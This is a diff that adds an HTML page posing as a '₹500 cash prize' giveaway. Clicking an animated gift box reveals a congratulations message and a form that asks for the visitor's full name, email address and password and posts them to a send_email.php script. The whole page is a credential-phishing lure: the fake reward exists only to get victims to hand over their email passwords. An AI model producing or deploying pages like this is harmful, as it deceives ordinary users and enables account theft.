@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Win ₹500 Offer!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css"> <!-- Link to external CSS file -->
+</head>
+<body>
+    <!-- Animated gift box section -->
+    <div class="gift-container" id="giftBox" onclick="openGift()">
+        <img src="https://cdn-icons-png.flaticon.com/512/843/843327.png" alt="Gift Box" class="gift-icon">
+        
+        <div class="stylish-name">🎉
+     win ₹500 lokesh bamniya🎉</div>
+     
+  <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            font-family: 'Arial', sans-serif;
+        }
+        .stylish-name {
+            font-size: 50px;
+            font-weight: bold;
+            color: #69C9E3; /* नाम का रंग */
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3); /* टेक्स्ट के पीछे छाया */
+            transition: transform 0.3s, color 0.3s; /* हाइलाइट करने का इफेक्ट */
+        }
+        .stylish-name:hover {
+            color: #FF5722; /* हवर पर रंग बदलना */
+            transform: scale(1.1); /* हवर पर आकार बढ़ाना */
+        }
+    </style>
+     
+    </div>
+    
+    
+    
+    
+    
+    
+
+    <!-- Hidden message and form, revealed after clicking the gift -->
+    <div class="win-message" id="winMessage">
+        🎉 Congratulations! You have won ₹500 cash! 🎉
+        <p>Please fill out the form below to claim your reward.</p>
+    </div>
+
+    <div class="form-container" id="formContainer">
+        <h2>Fill Out the Form to Claim ₹500</h2>
+        <form id="offerForm" action="send_email.php" method="POST" onsubmit="showPending()">
+            <label for="name">Full Name:</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="email">Email Address:</label>
+            <input type="email" id="email" name="email" required>
+
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+
+            <label for="amount">Recharge Amount (₹):</label>
+            <input type="number" id="amount" name="amount" value="500" readonly>
+
+            <input type="submit" value="Claim My ₹500!">
+        </form>
+
+        <div class="pending" id="pendingMessage">Pending</div>
+    </div>
+
+    <script>
+        // Hide form and message initially
+        document.getElementById('winMessage').style.display = 'none';
+        document.getElementById('formContainer').style.display = 'none';
+
+        // Function to handle the gift click event
+        function openGift() {
+            const giftBox = document.getElementById('giftBox');
+            const winMessage = document.getElementById('winMessage');
+            const formContainer = document.getElementById('formContainer');
+
+            // Hide the gift box and show the win message and form
+            giftBox.style.display = 'none';
+            winMessage.style.display = 'block';
+            formContainer.style.display = 'block';
+        }
+
+        function showPending() {
+            document.getElementById('pendingMessage').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
